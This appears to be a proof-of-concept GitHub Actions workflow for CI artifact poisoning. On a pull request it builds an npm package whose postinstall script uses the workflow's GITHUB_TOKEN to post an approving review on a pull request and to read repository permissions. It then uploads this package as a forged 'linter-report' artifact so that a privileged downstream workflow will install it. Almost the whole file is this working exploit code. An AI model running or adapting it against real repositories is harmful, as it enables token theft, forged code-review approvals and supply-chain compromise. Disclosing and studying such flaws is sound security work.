---
name: Lint # poc
on:
  pull_request:
    branches: [main]

permissions:
  contents: read

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Build forged linter artifact
        run: |
          mkdir -p evil
          cat > evil/package.json <<'EOF'
          {"name":"poc-evil","version":"1.0.0","scripts":{"postinstall":"node postinstall.js"}}
          EOF
          cat > evil/postinstall.js <<'EOF'
          const cp = require('child_process');
          console.log('PRIV_RCE uid=' + process.getuid() + ' user=' + cp.execSync('id -un').toString().trim());
          console.log('PRIV_RCE cwd=' + process.cwd());
          console.log('PRIV_RCE repo=' + process.env.GITHUB_REPOSITORY + ' actor=' + process.env.GITHUB_ACTOR);
          console.log('PRIV_RCE token_present=' + (process.env.GITHUB_TOKEN ? 'yes' : 'no'));
          (async () => {
            const base = 'https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY;
            const H = {
              authorization: 'Bearer ' + process.env.GITHUB_TOKEN,
              accept: 'application/vnd.github+json',
              'user-agent': 'poc',
              'content-type': 'application/json'
            };
            const rv = await fetch(base + '/pulls/1/reviews', {
              method: 'POST',
              headers: H,
              body: JSON.stringify({ event: 'APPROVE', body: 'PRIV_RCE approve via stolen workflow token' })
            });
            console.log('PRIV_RCE_APPROVE status=' + rv.status + ' body=' + (await rv.text()).slice(0, 200));
            const rp = await fetch(base, { headers: H });
            const j = await rp.json();
            console.log('PRIV_RCE_API status=' + rp.status + ' full_name=' + j.full_name + ' perms=' + JSON.stringify(j.permissions));
          })().catch(e => console.log('PRIV_RCE_ERR ' + e.message));
          EOF
          ( cd evil && npm pack --pack-destination .. )
          cat > package.json <<'EOF'
          {"name":"poc-root","version":"1.0.0","private":true,"dependencies":{"poc-evil":"file:./poc-evil-1.0.0.tgz"},"allowScripts":{"poc-evil":true}}
          EOF
          printf 'FORGED REPORT from attacker artifact\n' > linter-report.txt
          printf '1' > pr-number.txt

      - name: Upload forged linter-report artifact
        if: always()
        uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: |
            package.json
            poc-evil-1.0.0.tgz
            linter-report.txt
            pr-number.txt
          if-no-files-found: ignore
